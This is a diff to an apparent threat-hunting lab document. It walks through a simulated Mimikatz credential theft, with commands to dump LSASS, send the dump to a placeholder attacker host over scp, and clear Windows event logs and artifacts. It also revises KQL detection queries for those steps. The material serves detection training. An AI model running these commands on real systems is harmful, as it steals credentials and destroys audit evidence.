@@ -3,21 +3,26 @@
 
 ## Steps the "Bad Actor" took to Create Logs and IoCs:
 1. Download Mimikatz:
-  - Obtained mimikatz_trunk.zip from a known repository or a malicious link (e.g., http://malicious-example.com/mimikatz_trunk.zip)
-  - Extracted it to a temporary folder: C:\Users\<User>\AppData\Local\Temp\mimikatz\
+  - Obtained mimikatz_master.zip from a known repository or a malicious link (e.g., https://github.com/ParrotSec/mimikatz)
+  - Extracted it to a temporary folder: C:\Users\<User>\AppData\Temp\Local\mimikatz-master\
 2. Execute Mimikatz:
-  - Renamed the binary to mimi64.exe to evade basic file-name detections.
+  - Renamed the binary "mimikatz.exe" to "mimi64.exe" to evade basic file-name detections.
   - Ran Mimikatz with typical arguments to dump credentials from LSASS:
-    ```mimi64.exe "privilege::debug" "sekurlsa::logonpasswords" exit```
-3. Attempt to Dump Credentials:
-  - Mimikatz accesses the LSASS process (lsass.exe) to read privileged memory.
-  - Cred dumps might be output to a file, e.g. C:\Users\<User>\AppData\Local\Temp\creddump.txt.
-4. Exfiltrate or Store the Dump File:
-  - Attacker may copy creddump.txt to a network share or upload it to a remote host.
-  - Afterward, the file is often deleted to cover tracks.
-5. Cleanup:
+    ```mimi64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\Users\<User>\AppData\Local\Temp\creddump.txt```
+3. Exfiltration of the dumped credentials:
+  - Attacker attempts to upload creddump.txt to a remote host.
+    ```scp C:\Users\<User>\AppData\Local\Temp\creddump.txt <threat-actor>@<threat-host>:/home/<threat-actor>```
+4. Cleanup:
   - Clears PowerShell or Windows Event Logs to hide evidence of unauthorized usage.
+    ```Remove-Item "C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"```
+    ```wevtutil cl Application```
+    ```wevtutil cl Security```
+    ```wevtutil cl System```
   - Removes or renames Mimikatz-related artifacts to avoid detection in subsequent scans.
+    ```del "C:\Users\<User>\AppData\Local\Temp\creddump.txt"```
+    ```Remove-Item -Recurse -Force "C:\Users\<User>\AppData\Local\Temp\mimikatz-master"```
+    ```del "C:\Windows\Prefetch\MIMI64.EXE*.pf"```
+
 
 ---
 
@@ -46,23 +51,23 @@
 ```kql
 // 1. Detect known Mimikatz file downloads or suspicious file name patterns
 DeviceFileEvents
-| where FileName has_any ("mimikatz", "mimi64", "mimi.exe", "mimikatz_trunk")
+| where FileName has_any ("mimikatz", "mimi", "katz", "mk")
 | project Timestamp, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessAccountName
 
 // 2. Identify Mimikatz execution via typical file names or rename attempts
 DeviceProcessEvents
-| where FileName in~ ("mimikatz.exe", "mimi64.exe", "mimi.exe")
-    or ProcessCommandLine has_any ("mimikatz", "mimi64", "sekurlsa::logonpasswords", "privilege::debug")
+| where FileName in ("mimikatz", "mimi", "katz", "mk")
+    or ProcessCommandLine has_any ("mimikatz", "mimi", "katz", "sekurlsa::logonpasswords", "privilege::debug")
 | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, ActionType
 
 // 3. Detect creation of the credential dump file (e.g. creddump.txt)
 DeviceFileEvents
-| where FileName has_any("creddump.txt", "dump.txt", "dumplsass.txt")
+| where FileName has_any("creddump.txt", "creds.txt", "dump.txt", "lsass.txt")
 | project Timestamp, DeviceName, FileName, ActionType, FolderPath, InitiatingProcessCommandLine
 
 // 4. Look for unusual outbound connections that might indicate data exfiltration
 DeviceNetworkEvents
-| where InitiatingProcessFileName in~ ("mimikatz.exe", "mimi64.exe", "mimi.exe", "powershell.exe")
+| where InitiatingProcessFileName in ("mimikatz.exe", "mimi64.exe", "mimi.exe", "powershell.exe")
 | where RemoteIP != "InternalIPs"  // Adjust for your environment's internal IP ranges
 | project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl
 | order by Timestamp desc
